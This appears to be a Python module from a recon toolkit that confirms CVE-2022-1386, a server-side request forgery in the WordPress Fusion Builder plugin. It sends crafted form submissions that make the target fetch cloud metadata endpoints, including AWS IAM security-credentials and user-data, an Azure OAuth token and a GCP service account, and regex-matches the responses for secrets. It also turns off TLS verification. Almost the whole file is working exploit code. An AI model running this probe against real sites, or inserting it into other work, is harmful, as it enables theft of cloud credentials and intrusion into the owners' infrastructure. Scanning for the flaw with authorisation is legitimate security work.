#!/usr/bin/env python3
"""Build NDJSON SSRF confirmed findings (sink URL + evidence).

Confirmation is independent of nuclei: only our fusionAction probe + sink
responses (or our own reflected OAST) produce output.

Subcommands:
  emit-oob     one blind/OAST finding line
  probe-fusion CVE-2022-1386 Fusion Builder multi-cloud sink probe
"""

from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import uuid
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, build_opener, HTTPSHandler, urlopen

# Prefer unverified TLS — recon targets often have odd certs / Cloudflare quirks.
_SSL_CTX = ssl.create_default_context()
try:
    _SSL_CTX.check_hostname = False
    _SSL_CTX.verify_mode = ssl.CERT_NONE
except Exception:
    pass
_OPENER = build_opener(HTTPSHandler(context=_SSL_CTX))

# desc, sink_url, evidence regexes (any match = hit)
# Covers AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba, OpenStack.
SINKS: list[tuple[str, str, list[str]]] = [
    # --- AWS ---
    (
        "AWS IMDSv1 — meta-data",
        "http://169.254.169.254/latest/meta-data/",
        [r"ami-id", r"instance-id", r"local-ipv4", r"public-ipv4", r"security-credentials", r"placement/"],
    ),
    (
        "AWS IMDSv1 — hostname",
        "http://169.254.169.254/latest/meta-data/hostname",
        [r"ip-\d+-\d+-\d+-\d+", r"\.ec2\.internal", r"\.compute\.internal", r"\.amazonaws\.com"],
    ),
    (
        "AWS IMDSv1 — instance-id",
        "http://169.254.169.254/latest/meta-data/instance-id",
        [r"\bi-[0-9a-f]{8,}\b"],
    ),
    (
        "AWS IMDSv1 — ami-id",
        "http://169.254.169.254/latest/meta-data/ami-id",
        [r"\bami-[0-9a-f]{8,}\b"],
    ),
    (
        "AWS IMDSv1 — iam/creds",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        [r"AccessKeyId", r"SecretAccessKey", r"Token", r"(?m)^[A-Za-z0-9+=,.@_-]{3,128}$"],
    ),
    (
        "AWS IMDSv1 — user-data",
        "http://169.254.169.254/latest/user-data",
        [r"#!/", r"cloud-config", r"write_files", r"runcmd", r"AWS_"],
    ),
    (
        "AWS IMDSv1 — account",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
        [r"AccountId", r"Code", r"LastUpdated"],
    ),
    # --- GCP (header often required; distinctive error still proves reachability) ---
    (
        "GCP metadata — email",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        [
            r"@developer\.gserviceaccount\.com",
            r"gserviceaccount\.com",
            r"Metadata-Flavor",
            r"Missing required header.*Metadata-Flavor",
        ],
    ),
    (
        "GCP metadata — IP",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
        [
            r"@developer\.gserviceaccount\.com",
            r"gserviceaccount\.com",
            r"Metadata-Flavor",
            r"Missing required header.*Metadata-Flavor",
        ],
    ),
    (
        "GCP metadata — project-id",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        [r"^[a-z][a-z0-9-]{4,28}[a-z0-9]$", r"Metadata-Flavor"],
    ),
    # --- Azure ---
    (
        "Azure IMDS — instance",
        "http://169.254.169.254/metadata/instance?api-version=2018-02-01",
        [
            r"vmId",
            r"subscriptionId",
            r"resourceGroupName",
            r"azEnvironment",
            r"Metadata header required",
            r"required metadata header",
        ],
    ),
    (
        "Azure IMDS — identity",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        [r"access_token", r"Metadata header required", r"required metadata header"],
    ),
    # --- DigitalOcean ---
    (
        "DigitalOcean metadata",
        "http://169.254.169.254/metadata/v1/",
        [r"interfaces/", r"vendor-data", r"public-keys", r"droplet_id", r"floating_ip"],
    ),
    (
        "DigitalOcean metadata — id",
        "http://169.254.169.254/metadata/v1/id",
        [r"(?m)^\d{5,}$"],
    ),
    # --- Oracle Cloud ---
    (
        "Oracle Cloud IMDS",
        "http://169.254.169.254/opc/v1/instance/",
        [r"oci-blockstorage", r"availabilityDomain", r"compartmentId", r"displayName", r"regionInfo"],
    ),
    (
        "Oracle Cloud IMDS v2",
        "http://169.254.169.254/opc/v2/instance/",
        [r"oci-blockstorage", r"availabilityDomain", r"compartmentId", r"Authorization header"],
    ),
    # --- Alibaba Cloud ---
    (
        "Alibaba Cloud metadata",
        "http://10.0.0.200/latest/meta-data/",
        [r"instance-id", r"image-id", r"private-ipv4", r"hostname", r"ram/"],
    ),
    (
        "Alibaba Cloud metadata (100.100)",
        "http://100.100.100.200/latest/meta-data/",
        [r"instance-id", r"image-id", r"private-ipv4", r"hostname", r"ram/"],
    ),
    # --- OpenStack ---
    (
        "OpenStack metadata",
        "http://169.254.169.254/openstack/latest/meta_data.json",
        [r"uuid", r"meta", r"hostname", r"project_id", r"availability_zone"],
    ),
]


def _snippet(body: str, limit: int = 160) -> str:
    one = re.sub(r"\s+", " ", body or "").strip()
    if len(one) > limit:
        return one[: limit - 3] + "..."
    return one


def _match_evidence(body: str, patterns: list[str]) -> str | None:
    text = (body or "").strip()
    if not text:
        return None
    # Ignore obvious WordPress/HTML error wrappers unless cloud markers present.
    if re.search(r"<(html|body|!doctype)\b", text, re.I) and not re.search(
        r"\b(ami-|i-[0-9a-f]{8,}|AccessKeyId|AccountId|vmId|Metadata-Flavor|"
        r"gserviceaccount|availabilityDomain|compartmentId|droplet)\b",
        text,
        re.I,
    ):
        return None
    for pat in patterns:
        m = re.search(pat, text, re.I | re.M)
        if m:
            got = m.group(0)
            if len(got) < 8 and len(text) > 8:
                return _snippet(text)
            return _snippet(got if len(got) <= 160 else text)
    return None


def _fusion_post(
    ajax_url: str,
    sink_url: str,
    nonce: str = "0",
    extra_header: str | None = None,
    timeout: float = 10.0,
) -> tuple[int | None, str]:
    boundary = f"---------------------------reconftw{uuid.uuid4().hex[:12]}"
    form_data = (
        f"email=recon%40example.com&fusion_privacy_store_ip_ua=false"
        f"&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
        f"&fusion-form-nonce-0={nonce}&fusion-fields-hold-private-data="
    )
    parts = [
        ("formData", form_data),
        ("action", "fusion_form_submit_form_to_url"),
        ("fusion_form_nonce", nonce),
        ("form_id", "0"),
        ("post_id", "0"),
        ("field_labels", '{"email":"Email address"}'),
        ("hidden_field_names", "[]"),
        ("fusionAction", sink_url),
        ("fusionActionMethod", "GET"),
    ]
    chunks: list[bytes] = []
    for name, value in parts:
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                f"{value}\r\n"
            ).encode("utf-8", errors="replace")
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    body = b"".join(chunks)

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "reconFTW-ssrf-probe",
    }
    if extra_header and ":" in extra_header:
        hk, hv = extra_header.split(":", 1)
        headers[hk.strip()] = hv.strip()

    req = Request(ajax_url, data=body, headers=headers, method="POST")
    try:
        with _OPENER.open(req, timeout=timeout) as resp:  # noqa: S310 - intentional SSRF probe
            raw = resp.read(65536)
            return int(getattr(resp, "status", 200) or 200), raw.decode("utf-8", errors="replace")
    except HTTPError as e:
        raw = e.read(65536) if hasattr(e, "read") else b""
        return int(e.code), raw.decode("utf-8", errors="replace")
    except (URLError, TimeoutError, OSError):
        return None, ""


def _fetch_nonce(ajax_url: str, extra_header: str | None = None, timeout: float = 10.0) -> str:
    data = b"action=fusion_form_update_view"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "reconFTW-ssrf-probe",
    }
    if extra_header and ":" in extra_header:
        hk, hv = extra_header.split(":", 1)
        headers[hk.strip()] = hv.strip()
    req = Request(ajax_url, data=data, headers=headers, method="POST")
    try:
        with _OPENER.open(req, timeout=timeout) as resp:  # noqa: S310
            text = resp.read(65536).decode("utf-8", errors="replace")
    except (HTTPError, URLError, TimeoutError, OSError):
        return "0"
    m = re.search(r'fusion-form-nonce-0"[^>]*value="([^"]+)"', text)
    if m:
        return m.group(1)
    m = re.search(r'id="fusion-form-nonce-0"[^>]*value="([^"]+)"', text)
    return m.group(1) if m else "0"


# In-band canaries: prove fusionAction fetches attacker-controlled URLs without nuclei/OAST.
# desc, url, evidence regexes
INBAND_CANARIES: list[tuple[str, str, list[str]]] = [
    (
        "In-band SSRF — example.com",
        "http://example.com/",
        [r"Example Domain", r"iana\.org/domains/example"],
    ),
    (
        "In-band SSRF — example.com (https)",
        "https://example.com/",
        [r"Example Domain", r"iana\.org/domains/example"],
    ),
    (
        "In-band SSRF — neverssl",
        "http://neverssl.com/",
        [r"NeverSSL", r"probably\.works"],
    ),
]


def probe_fusion(
    ajax_url: str,
    *,
    oast_url: str | None = None,
    oast_reflected: bool = False,
    extra_header: str | None = None,
) -> dict[str, Any] | None:
    """Confirm CVE-2022-1386 via our fusionAction probe (not nuclei).

    Proof (any of):
      1) in-band canary body reflected (example.com / neverssl)
      2) cloud metadata sink body matched (AWS/GCP/Azure/DO/Oracle/Alibaba/OpenStack)
      3) our OAST canary was reflected
    """
    nonce = _fetch_nonce(ajax_url, extra_header=extra_header)
    hits: list[dict[str, Any]] = []

    # 1) In-band canaries — works with just SSRF, no nuclei, no collaborator, no cloud.
    for desc, sink_url, patterns in INBAND_CANARIES:
        status, body = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
        evidence = _match_evidence(body, patterns)
        if evidence is None:
            continue
        hits.append(
            {
                "desc": desc,
                "url": sink_url,
                "status": status,
                "evidence": evidence,
            }
        )
        break  # one solid in-band proof is enough

    # 2) Multi-cloud metadata sinks (always — impact evidence).
    for desc, sink_url, patterns in SINKS:
        status, body = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
        evidence = _match_evidence(body, patterns)
        if evidence is None and body and "169.254.169.254" in sink_url:
            if re.search(
                r"(ami-id|instance-id|local-ipv4|security-credentials|Metadata-Flavor|"
                r"subscriptionId|availabilityDomain|openstack)",
                body,
                re.I,
            ):
                evidence = _snippet(body)
        if evidence is None:
            continue
        hits.append(
            {
                "desc": desc,
                "url": sink_url,
                "status": status,
                "evidence": evidence,
            }
        )

    # 3) Our OAST canary (optional collaborator).
    if oast_reflected and oast_url:
        hits.append(
            {
                "desc": "OAST / collaborator (our probe)",
                "url": oast_url,
                "status": None,
                "evidence": "fusionAction response reflected Interactsh/OAST content from our SSRF probe",
            }
        )

    if not hits:
        return None

    return {
        "target": ajax_url,
        "cve": "CVE-2022-1386",
        "vector": "fusionAction",
        "vulnerable": True,
        "ssrf_hits": hits,
    }


def emit_oob(
    target: str,
    *,
    method: str = "GET",
    vector: str = "unknown",
    sink_url: str | None = None,
    evidence: str = "",
    status: int | None = None,
) -> dict[str, Any]:
    return {
        "target": target,
        "method": method,
        "vector": vector,
        "vulnerable": True,
        "ssrf_hits": [
            {
                "desc": f"Blind SSRF ({vector})" if vector else "Blind SSRF (OAST)",
                "url": sink_url or target,
                "status": status,
                "evidence": evidence or "OAST callback correlated to our request",
            }
        ],
    }


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_emit = sub.add_parser("emit-oob", help="Emit one OAST/blind SSRF NDJSON line")
    p_emit.add_argument("--target", required=True)
    p_emit.add_argument("--method", default="GET")
    p_emit.add_argument("--vector", default="unknown")
    p_emit.add_argument("--sink-url", default="")
    p_emit.add_argument("--evidence", default="")
    p_emit.add_argument("--status", type=int, default=None)

    p_probe = sub.add_parser("probe-fusion", help="Probe Fusion Builder multi-cloud sinks; emit NDJSON if confirmed")
    p_probe.add_argument("ajax_url")
    p_probe.add_argument("--oast-url", default="")
    p_probe.add_argument(
        "--oast-reflected",
        action="store_true",
        help="Our curl OAST canary was reflected (independent of nuclei)",
    )
    p_probe.add_argument("--header", default="")

    args = ap.parse_args()
    if args.cmd == "emit-oob":
        obj = emit_oob(
            args.target,
            method=args.method,
            vector=args.vector,
            sink_url=args.sink_url or None,
            evidence=args.evidence,
            status=args.status,
        )
    else:
        obj = probe_fusion(
            args.ajax_url,
            oast_url=args.oast_url or None,
            oast_reflected=bool(args.oast_reflected),
            extra_header=args.header or None,
        )
        if obj is None:
            return 0
    sys.stdout.write(json.dumps(obj, ensure_ascii=False) + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
